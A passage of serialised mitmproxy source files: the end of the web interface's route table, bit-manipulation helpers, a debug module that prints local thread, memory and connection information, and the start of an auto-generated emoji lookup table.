(r\"/commands(?:\\.json)?\", Commands),\n                (r\"/commands/(?P<cmd>[a-z.]+)\", ExecuteCommand),\n                (r\"/events(?:\\.json)?\", Events),\n                (r\"/flows(?:\\.json)?\", Flows),\n                (r\"/flows/dump\", DumpFlows),\n                (r\"/flows/resume\", ResumeFlows),\n                (r\"/flows/kill\", KillFlows),\n                (r\"/flows/(?P<flow_id>[0-9a-f\\-]+)\", FlowHandler),\n                (r\"/flows/(?P<flow_id>[0-9a-f\\-]+)/resume\", ResumeFlow),\n                (r\"/flows/(?P<flow_id>[0-9a-f\\-]+)/kill\", KillFlow),\n                (r\"/flows/(?P<flow_id>[0-9a-f\\-]+)/duplicate\", DuplicateFlow),\n                (r\"/flows/(?P<flow_id>[0-9a-f\\-]+)/replay\", ReplayFlow),\n                (r\"/flows/(?P<flow_id>[0-9a-f\\-]+)/revert\", RevertFlow),\n                (\n                    r\"/flows/(?P<flow_id>[0-9a-f\\-]+)/(?P<message>request|response|messages)/content.data\",\n                    FlowContent,\n                ),\n                (\n                    r\"/flows/(?P<flow_id>[0-9a-f\\-]+)/(?P<message>request|response|messages)/\"\n                    r\"content/(?P<content_view>[0-9a-zA-Z\\-\\_%]+)(?:\\.json)?\",\n                    FlowContentView,\n                ),\n                (r\"/clear\", ClearAll),\n                (r\"/options(?:\\.json)?\", Options),\n                (r\"/options/save\", SaveOptions),\n                (r\"/state(?:\\.json)?\", State),\n            ],\n        )\n", "mitmproxy/utils/bits.py": "def setbit(byte, offset, value):\n    \"\"\"\n    Set a bit in a byte to 1 if value is truthy, 0 if not.\n    \"\"\"\n    if value:\n        return byte | (1 << offset)\n    else:\n        return byte & ~(1 << offset)\n\n\ndef getbit(byte, offset):\n    mask = 1 << offset\n    return bool(byte & mask)\n", "mitmproxy/utils/debug.py": "import asyncio\nimport gc\nimport linecache\nimport os\nimport platform\nimport signal\nimport sys\nimport threading\nimport traceback\nfrom collections import Counter\nfrom contextlib import redirect_stdout\n\nfrom OpenSSL import SSL\n\nfrom mitmproxy import version\nfrom mitmproxy.utils import asyncio_utils\n\n\ndef dump_system_info():\n    mitmproxy_version = version.get_dev_version()\n    openssl_version: str | bytes = SSL.SSLeay_version(SSL.SSLEAY_VERSION)\n    if isinstance(openssl_version, bytes):\n        openssl_version = openssl_version.decode()\n\n    data = [\n        f\"Mitmproxy: {mitmproxy_version}\",\n        f\"Python:    {platform.python_version()}\",\n        f\"OpenSSL:   {openssl_version}\",\n        f\"Platform:  {platform.platform()}\",\n    ]\n    return \"\\n\".join(data)\n\n\ndef dump_info(signal=None, frame=None, file=sys.stdout):  # pragma: no cover\n    with redirect_stdout(file):\n        print(\"****************************************************\")\n        print(\"Summary\")\n        print(\"=======\")\n\n        try:\n            import psutil\n        except ModuleNotFoundError:\n            print(\"(psutil not installed, skipping some debug info)\")\n        else:\n            p = psutil.Process()\n            print(\"num threads: \", p.num_threads())\n            if hasattr(p, \"num_fds\"):\n                print(\"num fds: \", p.num_fds())\n            print(\"memory: \", p.memory_info())\n\n            print()\n            print(\"Files\")\n            print(\"=====\")\n            for i in p.open_files():\n                print(i)\n\n            print()\n            print(\"Connections\")\n            print(\"===========\")\n            for i in p.connections():\n                print(i)\n\n        print()\n        print(\"Threads\")\n        print(\"=======\")\n        bthreads = []\n        for i in threading.enumerate():\n            if hasattr(i, \"_threadinfo\"):\n                bthreads.append(i)\n            else:\n                print(i.name)\n        bthreads.sort(key=lambda x: x._thread_started)\n        for i in bthreads:\n            print(i._threadinfo())\n\n        print()\n        print(\"Memory\")\n        print(\"======\")\n        gc.collect()\n        objs = Counter(str(type(i)) for i in gc.get_objects())\n\n        for cls, count in objs.most_common(20):\n            print(f\"{count} {cls}\")\n\n        print()\n        print(\"Memory (mitmproxy only)\")\n        print(\"=======================\")\n        mitm_objs = Counter({k: v for k, v in objs.items() if \"mitmproxy\" in k})\n        for cls, count in mitm_objs.most_common(20):\n            print(f\"{count} {cls}\")\n\n        try:\n            asyncio.get_running_loop()\n        except RuntimeError:\n            pass\n        else:\n            print()\n            print(\"Tasks\")\n            print(\"=======\")\n            for task in asyncio.all_tasks():\n                f = task.get_stack(limit=1)[0]\n                line = linecache.getline(\n                    f.f_code.co_filename, f.f_lineno, f.f_globals\n                ).strip()\n                line = f\"{line}  # at {os.path.basename(f.f_code.co_filename)}:{f.f_lineno}\"\n                print(f\"{asyncio_utils.task_repr(task)}\\n\" f\"    {line}\")\n\n        print(\"****************************************************\")\n\n    if os.getenv(\"MITMPROXY_DEBUG_EXIT\"):  # pragma: no cover\n        sys.exit(1)\n\n\ndef dump_stacks(signal=None, frame=None, file=sys.stdout):\n    id2name = {th.ident: th.name for th in threading.enumerate()}\n    code = []\n    for threadId, stack in sys._current_frames().items():\n        code.append(\"\\n# Thread: %s(%d)\" % (id2name.get(threadId, \"\"), threadId))\n        for filename, lineno, name, line in traceback.extract_stack(stack):\n            code.append('File: \"%s\", line %d, in %s' % (filename, lineno, name))\n            if line:\n                code.append(\"  %s\" % (line.strip()))\n    print(\"\\n\".join(code), file=file)\n    if os.getenv(\"MITMPROXY_DEBUG_EXIT\"):  # pragma: no cover\n        sys.exit(1)\n\n\ndef register_info_dumpers():\n    if os.name != \"nt\":  # pragma: windows no cover\n        signal.signal(signal.SIGUSR1, dump_info)\n        signal.signal(signal.SIGUSR2, dump_stacks)\n", "mitmproxy/utils/emoji.py": "#!/usr/bin/env python3\n\"\"\"\nAll of the emoji and characters that can be used as flow markers.\n\"\"\"\n# auto-generated. run this file to refresh.\n\nemoji = {\n    \":+1:\": \"\ud83d\udc4d\",\n    \":-1:\": \"\ud83d\udc4e\",\n    \":100:\": \"\ud83d\udcaf\",\n    \":1234:\": \"\ud83d\udd22\",\n    \":1st_place_medal:\": \"\ud83e\udd47\",\n    \":2nd_place_medal:\": \"\ud83e\udd48\",\n    \":3rd_place_medal:\": \"\ud83e\udd49\",\n    \":8ball:\": \"\ud83c\udfb1\",\n    \":a:\": \"\ud83c\udd70\",\n    \":ab:\": \"\ud83c\udd8e\",\n    \":abacus:\": \"\ud83e\uddee\",\n    \":abc:\": \"\ud83d\udd24\",\n    \":abcd:\": \"\ud83d\udd21\",\n    \":accept:\": \"\ud83c\ude51\",\n    \":adhesive_bandage:\": \"\ud83e\ude79\",\n    \":adult:\": \"\ud83e\uddd1\",\n    \":aerial_tramway:\": \"\ud83d\udea1\",\n    \":afghanistan:\": \"\ud83c\udde6\u200d\ud83c\uddeb\",\n    \":airplane:\": \"\u2708\",\n    \":aland_islands:\": \"\ud83c\udde6\u200d\ud83c\uddfd\",\n    \":alarm_clock:\": \"\u23f0\",\n    \":albania:\": \"\ud83c\udde6\u200d\ud83c\uddf1\",\n    \":alembic:\": \"\u2697\",\n    \":algeria:\": \"\ud83c\udde9\u200d\ud83c\uddff\",\n    \":alien:\": \"\ud83d\udc7d\",\n    \":ambulance:\": \"\ud83d\ude91\",\n    \":american_samoa:\": \"\ud83c\udde6\u200d\ud83c\uddf8\",\n    \":amphora:\": \"\ud83c\udffa\",\n    \":anchor:\": \"\u2693\",\n    \":andorra:\": \"\ud83c\udde6\u200d\ud83c\udde9\",\n    \":angel:\": \"\ud83d\udc7c\",\n    \":anger:\": \"\ud83d\udca2\",\n    \":angola:\": \"\ud83c\udde6\u200d\ud83c\uddf4\",\n    \":angry:\": \"\ud83d\ude20\",\n    \":anguilla:\": \"\ud83c\udde6\u200d\ud83c\uddee\",\n    \":anguished:\": \"\ud83d\ude27\",\n    \":ant:\": \"\ud83d\udc1c\",\n    \":antarctica:\": \"\ud83c\udde6\u200d\ud83c\uddf6\",\n    \":antigua_barbuda:\": \"\ud83c\udde6\u200d\ud83c\uddec\",\n    \":apple:\": \"\ud83c\udf4e\",\n    \":aquarius:\": \"\u2652\",\n    \":argentina:\": \"\ud83c\udde6\u200d\ud83c\uddf7\",\n    \":aries:\": \"\u2648\",\n    \":armenia:\": \"\ud83c\udde6\u200d\ud83c\uddf2\",\n    \":arrow_backward:\": \"\u25c0\",\n    \":arrow_double_down:\": \"\u23ec\",\n    \":arrow_double_up:\": \"\u23eb\",\n    \":arrow_down:\": \"\u2b07\",\n    \":arrow_down_small:\": \"\ud83d\udd3d\",\n    \":arrow_forward:\": \"\u25b6\",\n    \":arrow_heading_down:\": \"\u2935\",\n    \":arrow_heading_up:\": \"\u2934\",\n    \":arrow_left:\": \"\u2b05\",\n    \":arrow_lower_left:\": \"\u2199\",\n    \":arrow_lower_right:\": \"\u2198\",\n    \":arrow_right:\": \"\u27a1\",\n    \":arrow_right_hook:\": \"\u21aa\",\n    \":arrow_up:\": \"\u2b06\",\n    \":arrow_up_down:\": \"\u2195\",\n    \":arrow_up_small:\": \"\ud83d\udd3c\",\n    \":arrow_upper_left:\": \"\u2196\",\n    \":arrow_upper_right:\": \"\u2197\",\n    \":arrows_clockwise:\": \"\ud83d\udd03\",\n    \":arrows_counterclockwise:\": \"\ud83d\udd04\",\n    \":art:\": \"\ud83c\udfa8\",\n    \":articulated_lorry:\": \"\ud83d\ude9b\",\n    \":artificial_satellite:\": \"\ud83d\udef0\",\n    \":artist:\": \"\ud83e\uddd1\u200d\ud83c\udfa8\",\n    \":aruba:\": \"\ud83c\udde6\u200d\ud83c\uddfc\",\n    \":ascension_island:\": \"\ud83c\udde6\u200d\ud83c\udde8\",\n    \":asterisk:\": \"*\u200d\u20e3\",\n    \":astonished:\": \"\ud83d\ude32\",\n    \":astronaut:\": \"\ud83e\uddd1\u200d\ud83d\ude80\",\n    \":athletic_shoe:\": \"\ud83d\udc5f\",\n    \":atm:\": \"\ud83c\udfe7\",\n    \":atom_symbol:\": \"\u269b\",\n    \":australia:\": \"\ud83c\udde6\u200d\ud83c\uddfa\",\n    \":austria:\": \"\ud83c\udde6\u200d\ud83c\uddf9\",\n    \":auto_rickshaw:\": \"\ud83d\udefa\",\n    \":avocado:\": \"\ud83e\udd51\",\n    \":axe:\": \"\ud83e\ude93\",\n    \":azerbaijan:\": \"\ud83c\udde6\u200d\ud83c\uddff\",\n    \":b:\": \"\ud83c\udd71\",\n    \":baby:\": \"\ud83d\udc76\",\n    \":baby_bottle:\": \"\ud83c\udf7c\",\n    \":baby_chick:\": \"\ud83d\udc24\",\n    \":baby_symbol:\": \"\ud83d\udebc\",\n    \":back:\": \"\ud83d\udd19\",\n    \":bacon:\": \"\ud83e\udd53\",\n    \":badger:\": \"\ud83e\udda1\",\n    \":badminton:\": \"\ud83c\udff8\",\n    \":bagel:\": \"\ud83e\udd6f\",\n    \":baggage_claim:\": \"\ud83d\udec4\",\n    \":baguette_bread:\": \"\ud83e\udd56\",\n    \":bahamas:\": \"\ud83c\udde7\u200d\ud83c\uddf8\",\n    \":bahrain:\": \"\ud83c\udde7\u200d\ud83c\udded\",\n    \":balance_scale:\": \"\u2696\",\n    \":bald_man:\": \"\ud83d\udc68\u200d\ud83e\uddb2\",\n    \":bald_woman:\": \"\ud83d\udc69\u200d\ud83e\uddb2\",\n    \":ballet_shoes:\": \"\ud83e\ude70\",\n    \":balloon:\": \"\ud83c\udf88\",\n    \":ballot_box:\": \"\ud83d\uddf3\",\n    \":ballot_box_with_check:\": \"\u2611\",\n    \":bamboo:\": \"\ud83c\udf8d\",\n    \":banana:\": \"\ud83c\udf4c\",\n    \":bangbang:\": \"\u203c\",\n    \":bangladesh:\": \"\ud83c\udde7\u200d\ud83c\udde9\",\n    \":banjo:\": \"\ud83e\ude95\",\n    \":bank:\": \"\ud83c\udfe6\",\n    \":bar_chart:\": \"\ud83d\udcca\",\n    \":barbados:\": \"\ud83c\udde7\u200d\ud83c\udde7\",\n    \":barber:\": \"\ud83d\udc88\",\n    \":baseball:\": \"\u26be\",\n    \":basket:\": \"\ud83e\uddfa\",\n    \":basketball:\": \"\ud83c\udfc0\",\n    \":basketball_man:\": \"\u26f9\u200d\u2642\",\n    \":basketball_woman:\": \"\u26f9\u200d\u2640\",\n    \":bat:\": \"\ud83e\udd87\",\n    \":bath:\": \"\ud83d\udec0\",\n    \":bathtub:\": \"\ud83d\udec1\",\n    \":battery:\": \"\ud83d\udd0b\",\n    \":beach_umbrella:\": \"\ud83c\udfd6\",\n    \":bear:\": \"\ud83d\udc3b\",\n    \":bearded_person:\": \"\ud83e\uddd4\",\n    \":bed:\": \"\ud83d\udecf\",\n    \":bee:\": \"\ud83d\udc1d\",\n    \":beer:\": \"\ud83c\udf7a\",\n    \":beers:\": \"\ud83c\udf7b\",\n    \":beetle:\": \"\ud83d\udc1e\",\n    \":beginner:\": \"\ud83d\udd30\",\n    \":belarus:\": \"\ud83c\udde7\u200d\ud83c\uddfe\",\n    \":belgium:\": \"\ud83c\udde7\u200d\ud83c\uddea\",\n    \":belize:\": \"\ud83c\udde7\u200d\ud83c\uddff\",\n    \":bell:\": \"\ud83d\udd14\",\n    \":bellhop_bell:\": \"\ud83d\udece\",\n    \":benin:\": \"\ud83c\udde7\u200d\ud83c\uddef\",\n    \":bento:\": \"\ud83c\udf71\",\n    \":bermuda:\": \"\ud83c\udde7\u200d\ud83c\uddf2\",\n    \":beverage_box:\": \"\ud83e\uddc3\",\n    \":bhutan:\": \"\ud83c\udde7\u200d\ud83c\uddf9\",\n    \":bicyclist:\": \"\ud83d\udeb4\",\n    \":bike:\": \"\ud83d\udeb2\",\n    \":biking_man:\": \"\ud83d\udeb4\u200d\u2642\",\n    \":biking_woman:\": \"\ud83d\udeb4\u200d\u2640\",\n    \":bikini:\": \"\ud83d\udc59\",\n    \":billed_cap:\": \"\ud83e\udde2\",\n    \":biohazard:\": \"\u2623\",\n    \":bird:\": \"\ud83d\udc26\",\n    \":birthday:\": \"\ud83c\udf82\",\n    \":black_circle:\": \"\u26ab\",\n    \":black_flag:\": \"\ud83c\udff4\",\n    \":black_heart:\": \"\ud83d\udda4\",\n    \":black_joker:\": \"\ud83c\udccf\",\n    \":black_large_square:\": \"\u2b1b\",\n    \":black_medium_small_square:\": \"\u25fe\",\n    \":black_medium_square:\": \"\u25fc\",\n    \":black_nib:\": \"\u2712\",\n    \":black_small_square:\": \"\u25aa\",\n    \":black_square_button:\": \"\ud83d\udd32\",\n    \":blond_haired_man:\": \"\ud83d\udc71\u200d\u2642\",\n    \":blond_haired_person:\": \"\ud83d\udc71\",\n    \":blond_haired_woman:\": \"\ud83d\udc71\u200d\u2640\",\n    \":blonde_woman:\": \"\ud83d\udc71\u200d\u2640\",\n    \":blossom:\": \"\ud83c\udf3c\",\n    \":blowfish:\": \"\ud83d\udc21\",\n    \":blue_book:\": \"\ud83d\udcd8\",\n    \":blue_car:\": \"\ud83d\ude99\",\n    \":blue_heart:\": \"\ud83d\udc99\",\n    \":blue_square:\": \"\ud83d\udfe6\",\n    \":blush:\": \"\ud83d\ude0a\",\n    \":boar:\": \"\ud83d\udc17\",\n    \":boat:\": \"\u26f5\",\n    \":bolivia:\": \"\ud83c\udde7\u200d\ud83c\uddf4\",\n    \":bomb:\": \"\ud83d\udca3\",\n    \":bone:\": \"\ud83e\uddb4\",\n    \":book:\": \"\ud83d\udcd6\",\n    \":bookmark:\": \"\ud83d\udd16\",\n    \":bookmark_tabs:\": \"\ud83d\udcd1\",\n    \":books:\": \"\ud83d\udcda\",\n    \":boom:\": \"\ud83d\udca5\",\n    \":boot:\": \"\ud83d\udc62\",\n    \":bosnia_herzegovina:\": \"\ud83c\udde7\u200d\ud83c\udde6\",\n    \":botswana:\": \"\ud83c\udde7\u200d\ud83c\uddfc\",\n    \":bouncing_ball_man:\": \"\u26f9\u200d\u2642\",\n    \":bouncing_ball_person:\": \"\u26f9\",\n    \":bouncing_ball_woman:\": \"\u26f9\u200d\u2640\",\n    \":bouquet:\": \"\ud83d\udc90\",\n    \":bouvet_island:\": \"\ud83c\udde7\u200d\ud83c\uddfb\",\n    \":bow:\": \"\ud83d\ude47\",\n    \":bow_and_arrow:\": \"\ud83c\udff9\",\n    \":bowing_man:\": \"\ud83d\ude47\u200d\u2642\",\n    \":bowing_woman:\": \"\ud83d\ude47\u200d\u2640\",\n    \":bowl_with_spoon:\": \"\ud83e\udd63\",\n    \":bowling:\": \"\ud83c\udfb3\",\n    \":boxing_glove:\": \"\ud83e\udd4a\",\n    \":boy:\": \"\ud83d\udc66\",\n    \":brain:\": \"\ud83e\udde0\",\n    \":brazil:\": \"\ud83c\udde7\u200d\ud83c\uddf7\",\n    \":bread:\": \"\ud83c\udf5e\",\n    \":breast_feeding:\": \"\ud83e\udd31\",\n    \":bricks:\": \"\ud83e\uddf1\",\n    \":bride_with_veil:\": \"\ud83d\udc70\",\n    \":bridge_at_night:\": \"\ud83c\udf09\",\n    \":briefcase:\": \"\ud83d\udcbc\",\n    \":british_indian_ocean_territory:\": \"\ud83c\uddee\u200d\ud83c\uddf4\",\n    \":british_virgin_islands:\": \"\ud83c\uddfb\u200d\ud83c\uddec\",\n    \":broccoli:\": \"\ud83e\udd66\",\n    \":broken_heart:\": \"\ud83d\udc94\",\n    \":broom:\": \"\ud83e\uddf9\",\n    \":brown_circle:\": \"\ud83d\udfe4\",\n    \":brown_heart:\": \"\ud83e\udd0e\",\n    \":brown_square:\": \"\ud83d\udfeb\",\n    \":brunei:\": \"\ud83c\udde7\u200d\ud83c\uddf3\",\n    \":bug:\": \"\ud83d\udc1b\",\n    \":building_construction:\": \"\ud83c\udfd7\",\n    \":bulb:\": \"\ud83d\udca1\",\n    \":bulgaria:\": \"\ud83c\udde7\u200d\ud83c\uddec\",\n    \":bullettrain_front:\": \"\ud83d\ude85\",\n    \":bullettrain_side:\": \"\ud83d\ude84\",\n    \":burkina_faso:\": \"\ud83c\udde7\u200d\ud83c\uddeb\",\n    \":burrito:\": \"\ud83c\udf2f\",\n    \":burundi:\": \"\ud83c\udde7\u200d\ud83c\uddee\",\n    \":bus:\": \"\ud83d\ude8c\",\n    \":business_suit_levitating:\": \"\ud83d\udd74\",\n    \":busstop:\": \"\ud83d\ude8f\",\n    \":bust_in_silhouette:\": \"\ud83d\udc64\",\n    \":busts_in_silhouette:\": \"\ud83d\udc65\",\n    \":butter:\": \"\ud83e\uddc8\",\n    \":butterfly:\": \"\ud83e\udd8b\",\n    \":cactus:\": \"\ud83c\udf35\",\n    \":cake:\": \"\ud83c\udf70\",\n    \":calendar:\": \"\ud83d\udcc6\",\n    \":call_me_hand:\": \"\ud83e\udd19\",\n    \":calling:\": \"\ud83d\udcf2\",\n    \":cambodia:\": \"\ud83c\uddf0\u200d\ud83c\udded\",\n    \":camel:\": \"\ud83d\udc2b\",\n    \":camera:\": \"\ud83d\udcf7\",\n    \":camera_flash:\": \"\ud83d\udcf8\",\n    \":cameroon:\": \"\ud83c\udde8\u200d\ud83c\uddf2\",\n    \":camping:\": \"\ud83c\udfd5\",\n    \":canada:\": \"\ud83c\udde8\u200d\ud83c\udde6\",\n    \":canary_islands:\": \"\ud83c\uddee\u200d\ud83c\udde8\",\n    \":cancer:\": \"\u264b\",\n    \":candle:\": \"\ud83d\udd6f\",\n    \":candy:\": \"\ud83c\udf6c\",\n    \":canned_food:\": \"\ud83e\udd6b\",\n    \":canoe:\": \"\ud83d\udef6\",\n    \":cape_verde:\": \"\ud83c\udde8\u200d\ud83c\uddfb\",\n    \":capital_abcd:\": \"\ud83d\udd20\",\n    \":capricorn:\": \"\u2651\",\n    \":car:\": \"\ud83d\ude97\",\n    \":card_file_box:\": \"\ud83d\uddc3\",\n    \":card_index:\": \"\ud83d\udcc7\",\n    \":card_index_dividers:\": \"\ud83d\uddc2\",\n    \":caribbean_netherlands:\": \"\ud83c\udde7\u200d\ud83c\uddf6\",\n    \":carousel_horse:\": \"\ud83c\udfa0\",\n    \":carrot:\": \"\ud83e\udd55\",\n    \":cartwheeling:\": \"\ud83e\udd38\",\n    \":cat:\": \"\ud83d\udc31\",\n    \":cat2:\": \"\ud83d\udc08\",\n    \":cayman_islands:\": \"\ud83c\uddf0\u200d\ud83c\uddfe\",\n    \":cd:\": \"\ud83d\udcbf\",\n    \":central_african_republic:\": \"\ud83c\udde8\u200d\ud83c\uddeb\",\n    \":ceuta_melilla:\": \"\ud83c\uddea\u200d\ud83c\udde6\",\n    \":chad:\": \"\ud83c\uddf9\u200d\ud83c\udde9\",\n    \":chains:\": \"\u26d3\",\n    \":chair:\": \"\ud83e\ude91\",\n    \":champagne:\": \"\ud83c\udf7e\",\n    \":chart:\": \"\ud83d\udcb9\",\n    \":chart_with_downwards_trend:\": \"\ud83d\udcc9\",\n    \":chart_with_upwards_trend:\": \"\ud83d\udcc8\",\n    \":checkered_flag:\": \"\ud83c\udfc1\",\n    \":cheese:\": \"\ud83e\uddc0\",\n    \":cherries:\": \"\ud83c\udf52\",\n    \":cherry_blossom:\": \"\ud83c\udf38\",\n    \":chess_pawn:\": \"\u265f\",\n    \":chestnut:\": \"\ud83c\udf30\",\n    \":chicken:\": \"\ud83d\udc14\",\n    \":child:\": \"\ud83e\uddd2\",\n    \":children_crossing:\": \"\ud83d\udeb8\",\n    \":chile:\": \"\ud83c\udde8\u200d\ud83c\uddf1\",\n    \":chipmunk:\": \"\ud83d\udc3f\",\n    \":chocolate_bar:\": \"\ud83c\udf6b\",\n    \":chopsticks:\": \"\ud83e\udd62\",\n    \":christmas_island:\": \"\ud83c\udde8\u200d\ud83c\uddfd\",\n    \":christmas_tree:\": \"\ud83c\udf84\",\n    \":church:\": \"\u26ea\",\n    \":cinema:\": \"\ud83c\udfa6\",\n    \":circus_tent:\": \"\ud83c\udfaa\",\n    \":city_sunrise:\": \"\ud83c\udf07\",\n    \":city_sunset:\": \"\ud83c\udf06\",\n    \":cityscape:\": \"\ud83c\udfd9\",\n    \":cl:\": \"\ud83c\udd91\",\n    \":clamp:\": \"\ud83d\udddc\",\n    \":clap:\": \"\ud83d\udc4f\",\n    \":clapper:\": \"\ud83c\udfac\",\n    \":classical_building:\": \"\ud83c\udfdb\",\n    \":climbing:\": \"\ud83e\uddd7\",\n    \":climbing_man:\": \"\ud83e\uddd7\u200d\u2642\",\n    \":climbing_woman:\": \"\ud83e\uddd7\u200d\u2640\",\n    \":clinking_glasses:\": \"\ud83e\udd42\",\n    \":clipboard:\": \"\ud83d\udccb\",\n    \":clipperton_island:\": \"\ud83c\udde8\u200d\ud83c\uddf5\",\n    \":clock1:\": \"\ud83d\udd50\",\n    \":clock10:\": \"\ud83d\udd59\",\n    \":clock1030:\": \"\ud83d\udd65\",\n    \":clock11:\": \"\ud83d\udd5a\",\n    \":clock1130:\": \"\ud83d\udd66\",\n    \":clock12:\": \"\ud83d\udd5b\",\n    \":clock1230:\": \"\ud83d\udd67\",\n    \":clock130:\": \"\ud83d\udd5c\",\n    \":clock2:\": \"\ud83d\udd51\",\n    \":clock230:\": \"\ud83d\udd5d\",\n    \":clock3:\": \"\ud83d\udd52\",\n    \":clock330:\": \"\ud83d\udd5e\",\n    \":clock4:\": \"\ud83d\udd53\",\n    \":clock430:\": \"\ud83d\udd5f\",\n    \":clock5:\": \"\ud83d\udd54\",\n    \":clock530:\": \"\ud83d\udd60\",\n    \":clock6:\": \"\ud83d\udd55\",\n    \":clock630:\": \"\ud83d\udd61\",\n    \":clock7:\": \"\ud83d\udd56\",\n    \":clock730:\": \"\ud83d\udd62\",\n    \":clock8:\": \"\ud83d\udd57\",\n    \":clock830:\": \"\ud83d\udd63\",\n    \":clock9:\": \"\ud83d\udd58\",\n    \":clock930:\": \"\ud83d\udd64\",\n    \":closed_book:\": \"\ud83d\udcd5\",\n    \":closed_lock_with_key:\": \"\ud83d\udd10\",\n    \":closed_umbrella:\": \"\ud83c\udf02\",\n    \":cloud:\": \"\u2601\",\n    \":cloud_with_lightning:\": \"\ud83c\udf29\",\n    \":cloud_with_lightning_and_rain:\": \"\u26c8\",\n    \":cloud_with_rain:\": \"\ud83c\udf27\",\n    \":cloud_with_snow:\": \"\ud83c\udf28\",\n    \":clown_face:\": \"\ud83e\udd21\",\n    \":clubs:\": \"\u2663\",\n    \":cn:\": \"\ud83c\udde8\u200d\ud83c\uddf3\",\n    \":coat:\": \"\ud83e\udde5\",\n    \":cocktail:\": \"\ud83c\udf78\",\n    \":coconut:\": \"\ud83e\udd65\",\n    \":cocos_islands:\": \"\ud83c\udde8\u200d\ud83c\udde8\",\n    \":coffee:\": \"\u2615\",\n    \":coffin:\": \"\u26b0\",\n    \":cold_face:\": \"\ud83e\udd76\",\n    \":cold_sweat:\": \"\ud83d\ude30\",\n    \":collision:\": \"\ud83d\udca5\",\n    \":colombia:\": \"\ud83c\udde8\u200d\ud83c\uddf4\",\n    \":comet:\": \"\u2604\",\n    \":comoros:\": \"\ud83c\uddf0\u200d\ud83c\uddf2\",\n    \":compass:\": \"\ud83e\udded\",\n    \":computer:\": \"\ud83d\udcbb\",\n    \":computer_mouse:\": \"\ud83d\uddb1\",\n    \":confetti_ball:\": \"\ud83c\udf8a\",\n    \":confounded:\": \"\ud83d\ude16\",\n    \":confused:\": \"\ud83d\ude15\",\n    \":congo_brazzaville:\": \"\ud83c\udde8\u200d\ud83c\uddec\",\n    \":congo_kinshasa:\": \"\ud83c\udde8\u200d\ud83c\udde9\",\n    \":congratulations:\": \"\u3297\",\n    \":construction:\": \"\ud83d\udea7\",\n    \":construction_worker:\": \"\ud83d\udc77\",\n    \":construction_worker_man:\": \"\ud83d\udc77\u200d\u2642\",\n    \":construction_worker_woman:\": \"\ud83d\udc77\u200d\u2640\",\n    \":control_knobs:\": \"\ud83c\udf9b\",\n    \":convenience_store:\": \"\ud83c\udfea\",\n    \":cook:\": \"\ud83e\uddd1\u200d\ud83c\udf73\",\n    \":cook_islands:\": \"\ud83c\udde8\u200d\ud83c\uddf0\",\n    \":cookie:\": \"\ud83c\udf6a\",\n    \":cool:\": \"\ud83c\udd92\",\n    \":cop:\": \"\ud83d\udc6e\",\n    \":copyright:\": \"\u00a9\",\n    \":corn:\": \"\ud83c\udf3d\",\n    \":costa_rica:\": \"\ud83c\udde8\u200d\ud83c\uddf7\",\n    \":cote_divoire:\": \"\ud83c\udde8\u200d\ud83c\uddee\",\n    \":couch_and_lamp:\": \"\ud83d\udecb\",\n    \":couple:\": \"\ud83d\udc6b\",\n    \":couple_with_heart:\": \"\ud83d\udc91\",\n    \":couple_with_heart_man_man:\": \"\ud83d\udc68\u200d\u2764\u200d\ud83d\udc68\",\n    \":couple_with_heart_woman_man:\": \"\ud83d\udc69\u200d\u2764\u200d\ud83d\udc68\",\n    \":couple_with_heart_woman_woman:\": \"\ud83d\udc69\u200d\u2764\u200d\ud83d\udc69\",\n    \":couplekiss:\": \"\ud83d\udc8f\",\n    \":couplekiss_man_man:\": \"\ud83d\udc68\u200d\u2764\u200d\ud83d\udc8b\u200d\ud83d\udc68\",\n    \":couplekiss_man_woman:\": \"\ud83d\udc69\u200d\u2764\u200d\ud83d\udc8b\u200d\ud83d\udc68\",\n    \":couplekiss_woman_woman:\": \"\ud83d\udc69\u200d\u2764\u200d\ud83d\udc8b\u200d\ud83d\udc69\",\n    \":cow:\": \"\ud83d\udc2e\",\n    \":cow2:\": \"\ud83d\udc04\",\n    \":cowboy_hat_face:\": \"\ud83e\udd20\",\n    \":crab:\": \"\ud83e\udd80\",\n    \":crayon:\": \"\ud83d\udd8d\",\n    \":credit_card:\": \"\ud83d\udcb3\",\n    \":crescent_moon:\": \"\ud83c\udf19\",\n    \":cricket:\": \"\ud83e\udd97\",\n    \":cricket_game:\": \"\ud83c\udfcf\",\n    \":croatia:\": \"\ud83c\udded\u200d\ud83c\uddf7\",\n    \":crocodile:\": \"\ud83d\udc0a\",\n    \":croissant:\": \"\ud83e\udd50\",\n    \":crossed_fingers:\": \"\ud83e\udd1e\",\n    \":crossed_flags:\": \"\ud83c\udf8c\",\n    \":crossed_swords:\": \"\u2694\",\n    \":crown:\": \"\ud83d\udc51\",\n    \":cry:\": \"\ud83d\ude22\",\n    \":crying_cat_face:\": \"\ud83d\ude3f\",\n    \":crystal_ball:\": \"\ud83d\udd2e\",\n    \":cuba:\": \"\ud83c\udde8\u200d\ud83c\uddfa\",\n    \":cucumber:\": \"\ud83e\udd52\",\n    \":cup_with_straw:\": \"\ud83e\udd64\",\n    \":cupcake:\": \"\ud83e\uddc1\",\n    \":cupid:\": \"\ud83d\udc98\",\n    \":curacao:\": \"\ud83c\udde8\u200d\ud83c\uddfc\",\n    \":curling_stone:\": \"\ud83e\udd4c\",\n    \":curly_haired_man:\": \"\ud83d\udc68\u200d\ud83e\uddb1\",\n    \":curly_haired_woman:\": \"\ud83d\udc69\u200d\ud83e\uddb1\",\n    \":curly_loop:\": \"\u27b0\",\n    \":currency_exchange:\": \"\ud83d\udcb1\",\n    \":curry:\": \"\ud83c\udf5b\",\n    \":cursing_face:\": \"\ud83e\udd2c\",\n    \":custard:\": \"\ud83c\udf6e\",\n    \":customs:\": \"\ud83d\udec3\",\n    \":cut_of_meat:\": \"\ud83e\udd69\",\n    \":cyclone:\": \"\ud83c\udf00\",\n    \":cyprus:\": \"\ud83c\udde8\u200d\ud83c\uddfe\",\n    \":czech_republic:\": \"\ud83c\udde8\u200d\ud83c\uddff\",\n    \":dagger:\": \"\ud83d\udde1\",\n    \":dancer:\": \"\ud83d\udc83\",\n    \":dancers:\": \"\ud83d\udc6f\",\n    \":dancing_men:\": \"\ud83d\udc6f\u200d\u2642\",\n    \":dancing_women:\": \"\ud83d\udc6f\u200d\u2640\",\n    \":dango:\": \"\ud83c\udf61\",\n    \":dark_sunglasses:\": \"\ud83d\udd76\",\n    \":dart:\": \"\ud83c\udfaf\",\n    \":dash:\": \"\ud83d\udca8\",\n    \":date:\": \"\ud83d\udcc5\",\n    \":de:\": \"\ud83c\udde9\u200d\ud83c\uddea\",\n    \":deaf_man:\": \"\ud83e\uddcf\u200d\u2642\",\n    